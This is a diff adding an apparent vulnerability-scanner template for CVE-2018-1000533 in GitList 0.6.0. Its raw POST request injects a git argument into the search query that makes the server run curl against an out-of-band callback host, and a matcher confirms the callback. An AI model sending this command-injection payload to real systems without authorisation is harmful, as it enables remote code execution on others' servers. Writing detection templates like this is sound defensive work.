@@ -1,0 +1,26 @@
+id: gitlist 0.6.0 RCE（CVE-2018-1000533）
+info:
+  name: gitlist-cve-2018-1000533 Remote Command Execution Vulnerability
+  author: nithissh
+  severity: critical
+  description: An adversary can perform a Remote Code Execution
+  reference: unknown
+  tags: gitlist, rce, oob
+
+requests:
+  - raw:
+      - |
+        POST /{{project}}/tree/a/search HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+
+        query=--open-files-in-pager=curl+--max-time+3+{{interactsh-url}};
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
